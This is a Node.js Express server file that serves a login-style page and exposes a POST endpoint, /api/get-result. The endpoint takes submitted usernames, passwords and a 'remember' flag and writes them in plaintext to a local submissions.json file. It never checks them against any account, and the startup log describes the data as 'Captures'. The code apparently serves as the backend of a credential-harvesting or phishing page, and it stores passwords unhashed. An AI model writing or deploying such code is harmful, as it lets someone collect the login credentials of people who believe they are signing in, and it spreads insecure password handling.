const express = require('express');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const app = express();
const PORT = 3000;

// Middleware to parse multipart/form-data text fields
const upload = multer();

const JSON_FILE_PATH = path.join(__dirname, 'submissions.json');

// Auto-initialize submissions database file if missing
if (!fs.existsSync(JSON_FILE_PATH)) {
  fs.writeFileSync(JSON_FILE_PATH, JSON.stringify([], null, 2));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Root route to serve your index.html page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint explicitly matched to your frontend fetch target
// Remove multer parsing requirements for this block since we are utilizing standard application/json headers
app.post('/api/get-result', (req, res) => {
  try {
    // Read variables natively out of the parsed json body
    const { username, password, remember } = req.body;

    const newEntry = {
      id: `ENTRY-${Date.now()}`,
      timestamp: new Date().toISOString(),
      username: username || "",
      password: password || "",
      additional_fields: {
        remember: remember || false
      }
    };

    const fileData = fs.readFileSync(JSON_FILE_PATH, 'utf8');
    const entries = JSON.parse(fileData || '[]');
    entries.push(newEntry);
    fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(entries, null, 2));

    // Send back a multi-compatible success footprint covering both evaluation patterns
    return res.json({ 
      success: true, 
      backendData: "Data successfully processed and logged." 
    });

  } catch (err) {
    console.error("Database log failed:", err);
    return res.status(500).json({ success: false, error: 'Internal server error processing payload' });
  }
});


app.listen(PORT, () => {
  console.log(`🚀 Live development server running at: http://localhost:${PORT}`);
  console.log(`📂 Captures routing straight to disk database: ${JSON_FILE_PATH}`);
});
